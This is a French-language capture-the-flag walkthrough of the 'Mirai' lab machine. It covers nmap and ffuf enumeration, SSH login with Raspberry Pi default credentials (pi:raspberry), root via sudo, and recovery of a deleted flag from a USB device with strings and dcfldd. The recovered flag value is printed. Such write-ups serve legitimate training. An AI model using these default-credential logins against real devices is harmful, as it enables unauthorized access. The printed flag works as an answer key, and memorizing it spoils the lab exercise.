# Mirai [Linux] Easy

# — 1. Enumeration —

## Nmap

`nmap -A -sS -sV 10.10.10.48`

```bash
22/tcp   open  ssh     OpenSSH 6.7p1 Debian 5+deb8u3 (protocol 2.0)
53/tcp   open  domain  dnsmasq 2.76
|_  bind.version: dnsmasq-2.76
80/tcp   open  http    lighttpd 1.4.35
|_http-server-header: lighttpd/1.4.35
1216/tcp open  upnp    Platinum UPnP 1.0.5.13 (UPnP/1.0 DLNADOC/1.50)
32400/tcp open  http    Plex Media Server httpd
|_http-favicon: Plex
| HTTP/1.1 401 Unauthorized\x0D
|_  Server returned status 401 but no WWW-Authenticate header.
|_http-cors: HEAD GET POST PUT DELETE OPTIONS
|_http-title: Unauthorized
32469/tcp open  upnp    Platinum UPnP 1.0.5.13 (UPnP/1.0 DLNADOC/1.50)
```

## FFuf

```bash
ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://10.10.10.48/FUZZ                                                                        

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.3.1 Kali Exclusive <3
________________________________________________

 :: Method           : GET
 :: URL              : http://10.10.10.48/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405
________________________________________________

admin                   [Status: 301, Size: 0, Words: 1, Lines: 1]
versions                [Status: 200, Size: 18, Words: 1, Lines: 1]
:: Progress: [220560/220560] :: Job [1/1] :: 2443 req/sec :: Duration: [0:01:55] :: Errors: 0 ::
```

/admin on Charge longtemps avant de tomber sur un Pi-hole

/version on récupéré un fichier avec dedans 

```bash
,v3.1.4,v3.1,v2.10
```

# — 2. Pi-Hole Exploitation—

Si on recherche des info à propos de pi-hole on trouve que le mot de passe du port ssh par défaut et l’utilisateur son :`pi:raspberry`

[https://discourse.pi-hole.net/t/password-for-pre-configured-pi-hole/13629/4](https://discourse.pi-hole.net/t/password-for-pre-configured-pi-hole/13629/4)

`ssh pi:10.10.10.48`

Connecter en tant que pi nous pouvons faire une énumération basique de notre user et nous sommes déjà admin nous pouvons donc nous mettre en root avec sudo su et aller chercher le root.txt

# — 3. root.txt —

Malheureusement le root.txt ne contient pas le flag mais ceci :

```bash
I lost my original root.txt! I think I may have a backup on my USB stick...
```

On liste donc les clé USB connecter avec `df -Th | grep media`

```bash
/dev/sdb ext4 8.7M 93K 7.9M 2% /media/usbstick 
```

On à obtenu le répertoire de la clé `/media/usbsitck`

Cette clé contient `damnit.txt`

```bash
Damnit! Sorry man I accidentally deleted your files off the USB stick.
Do you know if there is any way to get them back?

-James
```

Pour avoir le flag nous pouvons le faire de 2 manière :

**1 Strings**

`sudo strings /dev/sdb`

```bash
>r &
/media/usbstick
lost+found
root.txt
damnit.txt
>r &
>r &
/media/usbstick
lost+found
root.txt
damnit.txt
>r &
/media/usbstick
2]8^
lost+found
root.txt
damnit.txt
>r &
3d3e483143ff12ec505d026fa13e020b
Damnit! Sorry man I accidentally deleted your files off the USB stick.
Do you know if there is any way to get them back?
-James
```

**2 Image et Recover**

La commande `sudo dcfldd if=/dev/sdb of=/home/pi/usb.dd` créé une copie de la clé USB et la met sur le dossier de notre user maintenant nous allons nous envoyer ces fichier sur notre pc `scp [pi@10.10.10.48](mailto:pi@10.10.10.48):/home/pi/usb.dd /home/kali` pour extraire les données nous pouvons le faire avec plusieurs outils comme testdisk. On va pouvoir voir que le fichier à été supprimé et ne possède 0 octet.

En sachant ceci nous pouvons lister les strings de l’image pour voir les chaine de caractère ou regarder l’image avec un éditeur d’hexadécimal. 

![Untitled](Mirai%20%5BLinux%5D%20Easy%2096562ea34275498eaa1f259eae8d6a97/Untitled.png)

## — Lien et Ressources —

[https://linoxide.com/how-to-list-usb-devices-in-linux/](https://linoxide.com/how-to-list-usb-devices-in-linux/)

[https://www.it-connect.fr/chapitres/transfert-de-fichier-via-ssh/](https://www.it-connect.fr/chapitres/transfert-de-fichier-via-ssh/)

[https://www.tec4tric.com/linux/dev-sda-in-linux](https://www.tec4tric.com/linux/dev-sda-in-linux)